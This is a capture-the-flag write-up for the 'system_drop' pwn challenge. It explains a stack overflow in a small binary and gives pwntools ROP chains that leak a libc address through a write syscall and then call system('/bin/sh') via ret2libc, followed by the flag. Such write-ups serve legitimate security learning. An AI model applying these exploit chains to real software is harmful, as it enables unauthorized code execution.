# system_drop

This was second pwn challenge and probably a good one, as in all of the challenges were good, but this one was kinda....good for newbies, I guess.

# Vulnerability

This one had a very obvious vulnerability i.e. stack overflow:-

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  alarm(0xFu);
  read(0, buf, 0x100uLL);
  return 1;
}
```

The protection was just the `NX Enabled`, PIE was disabled as well.

# Exploitation

Well, the problem that arises here, obvious is there's no function which is already present in the binary which we can use to leak the LIBC address, so peformigng ret2libc seemed a bit out of hand, up until you see that there's a `syscall; ret` instruction available, since the `syscall` instruction is there, it very well hinted towards doing a `write` syscall to leak, but we had a problem which was about the control of the `rax`, which turned out to be a problem since there was no direct way to control the `rax` with the gadgets, but to my surprise during the return pointer overwrite the `rax` value was set to 0x1, this tackled the problem of setting the `rax` for the `write` syscall.

The `write` syscall ROP chain was like:-

```py
pop_rdi = 0x00000000004005d3
syscall = 0x000000000040053b
pop_rsi = 0x00000000004005d1


payload = b"A"*40
payload += p64(pop_rsi)
payload += p64(elf.got['read'])
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(syscall)
payload += p64(elf.symbols['main'])

```


This ROP chain was:

```
pop_rsi = read@got
r15 = 0x0
rdi = 1
syscall - > write(1, rea@got, rdx=100) rdx value was already 1
main -> jump to main
```

Now, then we get the LIBC leak, then we can do the ret2libc:-

```py
payload = b"A"*40
payload += p64(0x0000000000400416)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(0x0000000000400416)
payload += p64(libc.symbols['system'])
```

> The address `0x0000000000400416` points to the `ret` instruction is used to resolve the stack alignment issue.

Running the exploit, we get the flag: `CHTB{n0_0utput_n0_pr0bl3m_w1th_sr0p}`
